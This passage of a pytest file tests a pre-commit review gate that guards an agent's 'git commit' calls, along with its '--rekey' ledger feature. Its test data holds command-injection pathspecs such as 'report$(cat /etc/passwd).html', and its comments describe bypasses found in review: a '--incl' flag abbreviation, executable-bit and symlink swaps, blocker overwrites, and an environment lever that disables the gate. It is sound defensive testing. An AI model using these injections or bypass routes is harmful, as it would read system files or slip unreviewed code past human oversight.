        # arms at `--`). Not a live hole today because gate 3
        # (check_staged_scope) already denies this shape as missing-pathspec
        # before gate 3b is ever reached — but that is a DIFFERENT gate's
        # behavior, not a guarantee this function makes, so this case is
        # pinned here as documentation, not proof of safety on its own.
        ('git commit -m $(generate_msg) -- a.py', False),
        # Disarm at an unquoted control operator: a perfectly ordinary
        # chained command whose OWN pathspec has nothing dangerous in it
        # must not be denied just because something unquoted appears later.
        ('git commit -m "x" -- a.py && echo $(date)', False),
        ('git commit -m "x" -- a.py; echo $(date)', False),
        # Re-arm at a LATER bare `--`: a compound command's SECOND clause can
        # still carry the real injection, and disarming must not blind the
        # scan to it.
        ("git commit -- a.py && git commit -m x -- b$(cmd).py", True),
        # A REDIRECTION `&` (`2>&1`, `>&2`, `&>file`) must NOT disarm the
        # scan -- it doesn't end the pathspec region at all. Round-4's
        # bare-`&`-always-disarms logic wrongly treated these as backgrounding.
        ("git commit -m x -- a.py 2>&1 $(cmd)", True),
        ("git commit -m x -- a.py >&2 $(cmd)", True),
        ("git commit -m x -- a.py &>file $(cmd)", True),
        # A REAL bare `&` (backgrounding) still disarms.
        ('git commit -m "x" -- a.py & echo $(date)', False),
        # A real pipe disarms too.
        ('git commit -m "x" -- a.py | cat $(date)', False),
    ],
)
def test_command_has_unquoted_command_substitution(command, expected):
    assert prg.command_has_unquoted_command_substitution(command) is expected


def test_unquoted_command_substitution_in_pathspec_is_refused(sandbox, repo, make_payload):
    """B1: `_lib._split_segments` strips an unquoted `$(...)` as a segment
    boundary before this pathspec ever reaches unresolvable()'s token scan --
    the surviving fragment ("report") contains no shell metacharacter and
    typically matches nothing, which the "literal path matching nothing is
    safe" rule then waved through as nothing pending. Driven through the
    GATE (not just command_has_unquoted_command_substitution in isolation)
    so the real dispatcher wiring is what's proven, not just the helper.
    """
    cmd = 'git commit -m "x" -- report$(cat /etc/passwd).html'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None, "unquoted command substitution slipped through"
    assert block.hook == prg.HOOK_NAME, block.hook
    assert block.reason == prg.REASON_UNRESOLVABLE, block.reason


def test_quoted_shell_metachar_pathspec_is_not_falsely_refused(sandbox, repo, make_payload):
    """A properly quoted pathspec must reach the normal review flow, not B1's
    raw-command check -- that check only fires for an UNQUOTED construct."""
    (repo / "report (1).html").write_text("<html></html>\n")
    cmd = 'git commit -m "x" -- "report (1).html" a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None  # a.py is genuinely unreviewed
    assert block.reason == prg.REASON_UNREVIEWED, block.reason  # NOT unresolvable


def test_tracked_file_with_shell_metachar_name_is_not_wedged(sandbox, repo):
    """B3: my own B1 fix must not make a real, downloaded filename like
    "report (1).html" an unclearable deny. A token that trips the _SHELL_META
    scan is excused once git or the filesystem confirms it is real content."""
    name = "report (1).html"
    (repo / name).write_text("<html></html>\n")
    _git(repo, "add", name)
    _git(repo, "commit", "-q", "-m", "add report", "--", name)
    (repo / name).write_text("<html>v2</html>\n")

    block, reason, _ = prg.decide(_toplevel(repo), str(repo), [name])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED, reason  # NOT REASON_UNRESOLVABLE

    _record(repo, "--clean", "--paths", name)
    assert prg.decide(_toplevel(repo), str(repo), [name])[0] is False


def test_untracked_file_with_shell_metachar_name_is_not_wedged(sandbox, repo):
    """Same as above for a genuinely untracked (never `git add`ed) file --
    the resolution check's fallback to lexists, not just `git ls-files`."""
    name = "notes~draft.txt"
    (repo / name).write_text("draft\n")
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), [name])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED, reason

    # Paired recovery (matches the tracked sibling above): reviewing it must
    # actually clear the gate, not just correctly diagnose it.
    _record(repo, "--clean", "--paths", name)
    assert prg.decide(_toplevel(repo), str(repo), [name])[0] is False


# ---------------------------------------------------------------------------
# round-4 review regressions (round-3's OWN fixes had 2 blockers)
# ---------------------------------------------------------------------------


def test_expanding_metachar_with_a_real_decoy_name_is_still_refused(sandbox, repo):
    """Round-4 BLOCKER: `_token_resolves_to_real_content` excused ANY
    _SHELL_META character alike, including `$`/backtick/`{`. Those three can
    expand an unquoted token to a DIFFERENT string before git ever sees it,
    so a tracked file literally named "$FILES" is not evidence that an
    unquoted `$FILES` pathspec is safe -- it excused the token anyway,
    silently landing whatever the shell would really substitute. Only `(`/`~`
    may be excused by real-content resolution; `$`/backtick/`{` must stay
    refused even when a same-named decoy file genuinely exists.
    """
    (repo / "$FILES").write_text("decoy\n")
    _git(repo, "add", "$FILES")
    _git(repo, "commit", "-q", "-m", "decoy", "--", "$FILES")

    (repo / "src").mkdir()
    (repo / "src" / "{a,b}.py").write_text("decoy\n")
    _git(repo, "add", "src/{a,b}.py")
    _git(repo, "commit", "-q", "-m", "decoy2", "--", "src/{a,b}.py")

    for decoy in ("$FILES", "src/{a,b}.py"):
        block, reason, _ = prg.decide(_toplevel(repo), str(repo), [decoy])
        assert block is True, decoy
        assert reason == prg.REASON_UNRESOLVABLE, (decoy, reason)


def test_chained_command_with_a_clean_pathspec_is_not_wedged(sandbox, repo, make_payload):
    """Round-4 BLOCKER: the B1 scan armed at the first `--` and never
    disarmed, so an ORDINARY chained command whose own pathspec has nothing
    dangerous in it was denied forever -- recording a review can never clear
    an UNRESOLVABLE verdict, which is exactly the failure class this whole
    check exists to prevent, here self-inflicted rather than from an
    attacker. Must reach the normal review flow, not REASON_UNRESOLVABLE.
    """
    cmd = 'git commit -m "x" -- a.py && echo $(date)'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None  # a.py is genuinely unreviewed
    assert block.reason == prg.REASON_UNREVIEWED, block.reason  # NOT unresolvable

    _record(repo, "--clean", "--paths", "a.py")
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is None or block.hook != prg.HOOK_NAME, "reviewing a.py must clear it"


def test_second_clause_of_a_compound_command_still_catches_injection(sandbox, repo, make_payload):
    """The disarm fix for the false positive above must not blind the scan
    to a real injection in a LATER clause of the same compound command."""
    cmd = "git commit -q -m x -- a.py && git commit -m x -- b$(cmd).py"
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None
    assert block.reason == prg.REASON_UNRESOLVABLE, block.reason


def test_rollback_lever_also_covers_the_command_substitution_check(sandbox, repo, monkeypatch):
    """CSA_NO_PRECOMMIT_REVIEW=1 disables the WHOLE gate, including the B1
    check -- it is checked inside decide() specifically so this lever needs
    no separate wiring. Pinned so a future reorder above
    disabled_by_operator() can't silently carve this check out from under
    the lever without a test noticing."""
    monkeypatch.setenv("CSA_NO_PRECOMMIT_REVIEW", "1")
    cmd = 'git commit -m "x" -- report$(cat /etc/passwd).html'
    assert prg.decide(_toplevel(repo), str(repo), ["report$(cat /etc/passwd).html"], command=cmd)[0] is False


def test_include_abbreviation_widens_the_review_target_set(sandbox, repo, make_payload):
    """B2: git accepts `--incl` as an unambiguous abbreviation of `--include`;
    the exact-match check missed it and let it silently widen the commit
    (via `_segment_includes_index`) without the gate ever noticing the extra
    staged content it now covers."""
    (repo / "secret.py").write_text("s = 'EVIL'\n")
    _git(repo, "add", "secret.py")
    _record(repo, "--clean", "--paths", "a.py")  # only a.py was reviewed

    cmd = 'git commit --incl -m "only reviewed" -- a.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _detail = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None, "unreviewed staged file slipped through --incl"
    assert block.hook == prg.HOOK_NAME, block.hook


def test_include_abbreviation_does_not_collide_with_interactive(sandbox, repo, make_payload):
    """`--in`/`--int` must stay ambiguous with `--interactive` and NOT be
    treated as `--include` — only `--inc` and longer are unambiguous."""
    assert ptb._matches_include_flag("--in") is False
    assert ptb._matches_include_flag("--int") is False
    assert ptb._matches_include_flag("--interactive") is False
    assert ptb._matches_include_flag("--inc") is True
    assert ptb._matches_include_flag("--includes") is False  # longer than --include


def test_ledger_legacy_and_ts_suffixed_lines_both_resolve(tmp_path):
    """R3-9 (#4400): the named falsifiability test for the ledger format change.
    Gate 3b must resolve a PRE-change legacy entry and a NEW ts-suffixed entry
    identically — the appended telemetry fields are invisible to the gate."""
    import record_review as rr

    ledger = tmp_path / "last_reviewed"
    ledger.write_text(
        "/repo/x precommit:aaaa1111bbbb2222 clean\n"
        "/repo/y precommit:cccc3333dddd4444 clean ts=2026-08-23T12:00:00Z item=gh-4400\n"
        "/repo/z precommit:eeee5555ffff6666 blockers:2 ts=2026-08-23T12:01:00Z\n"
    )
    assert rr.head_review_outcome(str(ledger), "/repo/x", "precommit:aaaa1111bbbb2222") == (
        rr.OUTCOME_CLEAN,
        0,
    )
    assert rr.head_review_outcome(str(ledger), "/repo/y", "precommit:cccc3333dddd4444") == (
        rr.OUTCOME_CLEAN,
        0,
    )
    assert rr.head_review_outcome(str(ledger), "/repo/z", "precommit:eeee5555ffff6666") == (
        rr.OUTCOME_BLOCKERS,
        2,
    )


# ---------------------------------------------------------------------------
# AA-0064 (2026-09-01 agentic-systems-architect audit / gate-optimization
# plan waste-elimination P3) — record_review.py's `--rekey`: carrying a
# prior CLEAN review's outcome forward to the new digest when the ONLY
# change since then is an untracked file having been staged. THE SAFETY IS
# THE BYTE-IDENTICAL (SHA256) PREDICATE — every "refuses" test here proves a
# REAL content difference is never waved through.
# ---------------------------------------------------------------------------


def test_added_paths_detects_a_freshly_added_file(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    _git(repo, "add", "new_module.py")
    root = _toplevel(repo)
    assert prg._added_paths(root, ["new_module.py", "a.py"]) == {"new_module.py"}


def test_added_paths_empty_when_nothing_newly_added(sandbox, repo):
    # `a.py` was modified by the `repo` fixture, not newly added.
    root = _toplevel(repo)
    assert prg._added_paths(root, ["a.py"]) == set()


def test_reconstruct_pending_diff_assuming_untracked_matches_real_untracked_material(sandbox, repo):
    """Sanity: forcing exactly the set git ALREADY reports as untracked must
    reproduce the SAME text `pending_diff` itself computes — the
    reconstruction is not a re-derived approximation of the untracked
    grammar, it is the same formatter."""
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    real = prg.pending_diff(root, str(repo), ["new_module.py"])
    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["new_module.py"], {"new_module.py"}
    )
    assert reconstructed == real


def test_rekey_digest_matches_after_untracked_file_staged(sandbox, repo):
    """THE CORE MECHANISM: a file reviewed while untracked, then staged with
    byte-identical content, reconstructs to the EXACT prior digest."""
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "new_module.py")
    # Staging alone moved the digest -- the documented AA-0064 problem.
    current_key = prg.pending_key(root, str(repo), ["new_module.py"])
    assert current_key != prior_key

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["new_module.py"], prior_digest_hex
    )
    assert result == current_key


def test_rekey_digest_refuses_when_content_actually_changed(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "new_module.py")
    (repo / "new_module.py").write_text("def thing():\n    return 999\n")  # real change

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["new_module.py"], prior_digest_hex
    )
    assert result is None


def test_rekey_digest_refuses_with_a_bogus_prior_digest(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    _git(repo, "add", "new_module.py")
    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["new_module.py"], "0" * 16
    )
    assert result is None


# ---------------------------------------------------------------------------
# BLOCKER 2 (2026-09-01 cold HIGH review, live-reproduced both ways): the
# byte-identical predicate is LOSSY through the untracked-content grammar —
# it reads raw bytes via a real open(), which carries NO file-mode bit and
# FOLLOWS a symlink to its TARGET's content. A file reviewed while untracked
# with default permissions, then staged as executable (100755), digests
# identically under the old predicate; a file reviewed while untracked as a
# plain byte-identical copy of some other tracked file, then staged as a
# SYMLINK (120000) to that file, ALSO digests identically (open() follows
# the symlink at reconstruction time exactly as it did at review time) even
# though the commit lands a completely different git object (a symlink
# whose blob is the target PATH STRING, not the target's content). Both are
# fixed the same way: `_added_path_new_modes` must show every newly-added
# path staged as EXACTLY `_PLAIN_FILE_MODE` ("100644"), or the whole
# predicate refuses.
# ---------------------------------------------------------------------------


def test_added_path_new_modes_reports_the_real_staged_mode(sandbox, repo):
    (repo / "zz_plain.txt").write_text("plain\n")
    (repo / "zz_exec.sh").write_text("#!/bin/sh\necho hi\n")
    os.chmod(repo / "zz_exec.sh", 0o755)
    _git(repo, "add", "zz_plain.txt", "zz_exec.sh")
    root = _toplevel(repo)
    modes = prg._added_path_new_modes(root, ["zz_plain.txt", "zz_exec.sh"])
    assert modes == {"zz_plain.txt": "100644", "zz_exec.sh": "100755"}


def test_added_path_new_modes_reports_symlink_mode(sandbox, repo):
    (repo / "zz_target.txt").write_text("shared content\n")
    _git(repo, "add", "zz_target.txt")
    _git(repo, "commit", "-q", "-m", "target", "--", "zz_target.txt")
    os.symlink("zz_target.txt", str(repo / "zz_link.txt"))
    _git(repo, "add", "zz_link.txt")
    root = _toplevel(repo)
    modes = prg._added_path_new_modes(root, ["zz_link.txt"])
    assert modes == {"zz_link.txt": "120000"}


def test_rekey_digest_refuses_when_staged_with_an_executable_bit(sandbox, repo):
    """RED without BLOCKER 2's fix: chmod 0755 after a clean review of the
    file while untracked (default, non-executable) must never be waved
    through as 'the same content' — an executable bit is a real, security-
    relevant difference the byte-only reconstruction cannot see."""
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "new_module.py")
    os.chmod(repo / "new_module.py", 0o755)  # the live-reproduced exploit

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["new_module.py"], prior_digest_hex
    )
    assert result is None


def test_rekey_digest_refuses_when_staged_as_a_symlink(sandbox, repo):
    """RED without BLOCKER 2's fix: reviewing a byte-identical plain-file
    copy of some other tracked file's content, then staging a SYMLINK to
    that file instead, must never be waved through — the reviewer saw plain
    file content; the commit would land a 120000 symlink whose blob is the
    TARGET PATH STRING, not the content that was ever reviewed."""
    root = _toplevel(repo)
    (repo / "zz_target.txt").write_text("shared content\n")
    _git(repo, "add", "zz_target.txt")
    _git(repo, "commit", "-q", "-m", "target", "--", "zz_target.txt")

    (repo / "new_module.py").write_text("shared content\n")  # untracked plain file
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    (repo / "new_module.py").unlink()
    os.symlink("zz_target.txt", str(repo / "new_module.py"))  # the live-reproduced exploit
    _git(repo, "add", "new_module.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["new_module.py"], prior_digest_hex
    )
    assert result is None


def test_rekey_cli_refuses_when_staged_as_executable(sandbox, repo):
    """Full round trip: the CLI path refuses too, and the gate stays
    blocked -- an executable addition is never waved through end-to-end."""
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")

    _git(repo, "add", "new_module.py")
    os.chmod(repo / "new_module.py", 0o755)

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert prg.decide(root, str(repo), ["new_module.py"])[0] is True


def test_rekey_cli_refuses_when_staged_as_symlink(sandbox, repo):
    root = _toplevel(repo)
    (repo / "zz_target.txt").write_text("shared content\n")
    _git(repo, "add", "zz_target.txt")
    _git(repo, "commit", "-q", "-m", "target", "--", "zz_target.txt")

    (repo / "new_module.py").write_text("shared content\n")
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")

    (repo / "new_module.py").unlink()
    os.symlink("zz_target.txt", str(repo / "new_module.py"))
    _git(repo, "add", "new_module.py")

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert prg.decide(root, str(repo), ["new_module.py"])[0] is True


# ---------------------------------------------------------------------------
# BLOCKER 1 (2026-09-01 cold HIGH review, live-reproduced): --rekey must
# never overwrite an EXISTING entry at its target digest -- most dangerously
# an unresolved blockers:N entry, which decide()'s own STATUS_UPDATE path
# would otherwise silently rewrite to clean the moment a rekey call reaches
# it, flipping the gate from deny to allow over real, unresolved findings.
# ---------------------------------------------------------------------------


def test_rekey_refuses_when_target_digest_already_has_blockers(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")  # clean at the untracked digest

    _git(repo, "add", "new_module.py")  # digest moves
    # A REAL review of the now-staged content found 3 unresolved blockers.
    _record(repo, "--blockers", "3", "--paths", "new_module.py")
    target_key = prg.pending_key(root, str(repo), ["new_module.py"])
    before_text = sandbox.last_reviewed.read_text()
    assert f"{target_key} blockers:3" in before_text or "blockers:3" in before_text

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0

    after_text = sandbox.last_reviewed.read_text()
    assert after_text == before_text  # untouched, byte-for-byte
    # The TARGET digest's own outcome specifically must still be blockers:3
    # -- not merely "the string 'blockers:3' appears somewhere" (the prior
    # entry's own separate clean line, at a DIFFERENT digest, legitimately
    # coexists in the ledger and is not what this assertion is about).
    target_line = next(ln for ln in after_text.splitlines() if target_key in ln)
    assert "blockers:3" in target_line
    assert "clean" not in target_line
    # Gate stays blocked: 3 known blockers were never silently cleared.
    assert prg.decide(root, str(repo), ["new_module.py"])[0] is True


def test_rekey_refuses_when_target_digest_already_recorded_clean(sandbox, repo):
    """--rekey never WRITES over ANY existing entry at the target key, not
    just blockers -- even a pre-existing CLEAN entry (the ledger stays
    byte-for-byte unchanged either way). Nit 2 (2026-09-01 fix round 2)
    distinguishes the MESSAGE for this specific already-clean case from a
    genuine refusal -- see test_rekey_already_clean_prints_idempotent_
    success_not_refused for that wording assertion."""
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")

    _git(repo, "add", "new_module.py")
    _record(repo, "--clean", "--paths", "new_module.py")  # target already clean, independently
    before_text = sandbox.last_reviewed.read_text()

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert sandbox.last_reviewed.read_text() == before_text


def test_rekey_already_clean_prints_idempotent_success_not_refused(sandbox, repo, capsys):
    """Nit 2 (2026-09-01 fix round 2): re-running an already-successful
    --rekey (a retried/duplicate call onto a target digest that already
    carries the SAME clean outcome) must read as an idempotent success, not
    an alarming "REFUSED" -- "REFUSED" stays reserved for the genuine
    blockers/unknown-outcome refusal cases (BLOCKER 1)."""
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")

    _git(repo, "add", "new_module.py")
    _record(repo, "--clean", "--paths", "new_module.py")  # target already clean, independently
    capsys.readouterr()  # discard prior output

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    out = capsys.readouterr().out
    assert "REFUSED" not in out
    assert "already recorded clean" in out
    assert "idempotent" in out


def test_rekey_onto_target_with_blockers_still_says_refused(sandbox, repo, capsys):
    """The negative twin: the genuine blockers refusal must still say
    REFUSED -- Nit 2's wording change is scoped to the already-clean case
    only."""
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")

    _git(repo, "add", "new_module.py")
    _record(repo, "--blockers", "1", "--paths", "new_module.py")
    capsys.readouterr()

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    out = capsys.readouterr().out
    assert "REFUSED" in out


# ---------------------------------------------------------------------------
# Item 5 (2026-09-01 fix round): a prior entry with an UNKNOWN (bare, no
# --clean/--blockers ever recorded) outcome must also refuse -- only a
# prior CLEAN carries forward.
# ---------------------------------------------------------------------------


def test_rekey_cli_refuses_when_prior_review_outcome_is_unknown(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--paths", "new_module.py")  # no --clean/--blockers -> UNKNOWN outcome
    before_text = sandbox.last_reviewed.read_text()
    assert "clean" not in before_text and "blockers" not in before_text

    _git(repo, "add", "new_module.py")
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert sandbox.last_reviewed.read_text() == before_text
    assert prg.decide(root, str(repo), ["new_module.py"])[0] is True


# ---------------------------------------------------------------------------
# Item 7 (2026-09-01 fix round): keep as regressions the two correctly-
# refusing/accepting combos the reviewer independently verified.
# ---------------------------------------------------------------------------


def test_rekey_accepts_two_reviewed_files_one_staged(sandbox, repo):
    """Two files reviewed together while both untracked; only ONE gets
    staged before the rekey -- must still accept (the OTHER file legitimately
    stays untracked in both the prior and current reconstruction)."""
    (repo / "new_a.py").write_text("a = 1\n")
    (repo / "new_b.py").write_text("b = 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_a.py", "new_b.py"])
    _record(repo, "--clean", "--paths", "new_a.py", "new_b.py")

    _git(repo, "add", "new_a.py")  # only new_a.py staged; new_b.py stays untracked
    assert prg.decide(root, str(repo), ["new_a.py", "new_b.py"])[0] is True  # RED first

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key,
            "--paths", "new_a.py", "new_b.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert prg.decide(root, str(repo), ["new_a.py", "new_b.py"])[0] is False


def test_rekey_refuses_when_reviewed_files_plus_extra_untracked_both_staged(sandbox, repo):
    """A file reviewed as untracked, staged -- but an EXTRA, never-reviewed
    untracked file is ALSO staged alongside it under the same --paths. This
    must refuse: the reconstruction only ever re-derives content for paths
    that were part of the ORIGINAL --paths set: an extra path added to THIS
    call's --paths that was never part of the prior review changes the
    diff's real content, and the digest correctly fails to reproduce."""
    (repo / "new_a.py").write_text("a = 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_a.py"])
    _record(repo, "--clean", "--paths", "new_a.py")

    (repo / "new_extra.py").write_text("extra = 1\n")  # never reviewed
    _git(repo, "add", "new_a.py", "new_extra.py")

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key,
            "--paths", "new_a.py", "new_extra.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert prg.decide(root, str(repo), ["new_a.py", "new_extra.py"])[0] is True


def test_unreviewed_commit_message_includes_rekey_hint_for_same_paths_different_digest(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    _record(repo, "--clean", "--paths", "new_module.py")
    root = _toplevel(repo)
    # Compute the prior key directly (same helper the gate itself used).
    prior_diff = prg.pending_diff(root, str(repo), ["new_module.py"])
    prior_key = prg.PRECOMMIT_PREFIX + prg.digest_of(prior_diff)

    _git(repo, "add", "new_module.py")  # moves the digest, gate re-fires
    block, reason, detail = prg.decide(root, str(repo), ["new_module.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED
    assert detail.get("rekey_hint") == prior_key

    msg = prg.message_for(reason, detail, ["new_module.py"], root)
    assert f"--rekey {prior_key}" in msg
    # The hint must name the conditions under which the rekey refuses
    # (fix-round-8 same-text pass): the chain-root digest-format requirement
    # and the readable-file-count cap.
    assert "dg=2" in msg
    assert "roughly 1000 readable files" in msg


def test_unreviewed_commit_message_has_no_hint_when_no_prior_review_exists(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    block, reason, detail = prg.decide(root, str(repo), ["new_module.py"])
    assert block is True
    assert "rekey_hint" not in detail
    msg = prg.message_for(reason, detail, ["new_module.py"], root)
    assert "--rekey" not in msg


# ---------------------------------------------------------------------------
# Item 6 (2026-09-01 fix round): gate 3b never ADVERTISES --rekey for a
# directory-shaped pathspec. This is a usability suppression, not a
# correctness one (corrected fix-round-8 same-text pass: this comment used to
# say --rekey "structurally cannot succeed" there, which stopped being true
# once fix rounds 1-2 landed): a directory commonly sweeps in files beyond
# the ones reviewed together, so the suggested command would usually refuse
# for an unrelated reason.
# ---------------------------------------------------------------------------


def test_any_path_is_a_directory_true_for_a_real_directory(sandbox, repo):
    (repo / "newdir").mkdir()
    assert prg._any_path_is_a_directory(str(repo), ["newdir"]) is True


def test_any_path_is_a_directory_false_for_a_file(sandbox, repo):
    assert prg._any_path_is_a_directory(str(repo), ["a.py"]) is False


def test_unreviewed_commit_hint_suppressed_for_a_directory_pathspec(sandbox, repo):
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    (newdir / "b.py").write_text("b = 1\n")
    root = _toplevel(repo)
    # Record a clean review keyed to the DIRECTORY pathspec itself.
    _record(repo, "--clean", "--paths", "newdir")
    (newdir / "a.py").write_text("a = 2\n")  # moves the digest
    block, reason, detail = prg.decide(root, str(repo), ["newdir"])
    assert block is True
    assert "rekey_hint" not in detail
    msg = prg.message_for(reason, detail, ["newdir"], root)
    assert "--rekey" not in msg


# ---------------------------------------------------------------------------
# GH #5886: reconstruct_pending_diff_assuming_untracked's ORIGINAL membership
# test ("if n in ordered") only ever matched a name EQUAL to a pathspec
# entry. When an entry names a DIRECTORY, `ls-files --others -- <dir>`
# returns the FILES under it, none of which equals the directory string
# itself, so untracked_names came back empty and the reconstruction could
# never reproduce the digest recorded while those files were untracked --
# `rekey_digest_if_only_untracked_became_staged` then refused unconditionally
# for a directory pathspec, and gate 3b denied unreviewed-commit for content
# that was reviewed byte-for-byte.
#
# The FIRST fix (round 2) added an in-repo Python helper (`_entry_covers_
# name`, matching an exact string or a real on-disk directory prefix) to
# decide this half. A COLD round-2 review then found that helper itself was
# the wrong shape of fix: it decided membership using a narrower vocabulary
# than git's own pathspec matching, so a name matched only via a glob
# (`src/*.py`), pathspec magic (`:(top)evil.py`), or the bare root pathspec
# (`.`) was excluded from the tracked-diff half by GIT but never re-added on
# the untracked half by the HELPER — silently vanishing from the
# reconstruction (see the `test_glob_pathspec_with_new_unreviewed_file_
# after_review_refuses` section below for that failure mode's own tests).
#
# **CURRENT FIX (round 2, final): git decides BOTH halves, never a Python
# approximation of either.** `_entry_covers_name`/`_names_covered_by_entries`
# are deleted outright. The untracked set to re-add is simply `real_untracked
# (git ls-files --others, scoped to the pathspec) UNION force_untracked`
# (itself always derived from git's own `diff --name-status` added-paths
# list under the SAME pathspec, via `_added_paths` — never a caller-supplied
# guess or a Python directory-prefix check), with NO further Python
# filtering against the pathspec entries at all. This is what makes a
# directory, glob, AND magic-shaped pathspec all reconstruct correctly using
# the identical mechanism, rather than a directory-specific carve-out.
#
# THE BYTE-IDENTICAL SHA256 EQUALITY CHECK ALONE IS NOT THE SAFETY BOUNDARY
# (fix-round-3 correction, GH #5886 B1): a byte-identical digest match
# against a LOSSY reconstruction proves nothing. `reconstruct_pending_diff_
# assuming_untracked`'s untracked-material formatter decodes invalid UTF-8
# with `errors="replace"`, caps any one file's read at 8 MiB, and collapses
# everything past a 64 MiB aggregate or `_UNTRACKED_MAX_FILES` (2000) `parts`
# entries -- roughly 1000 READABLE files, since the formatter appends two
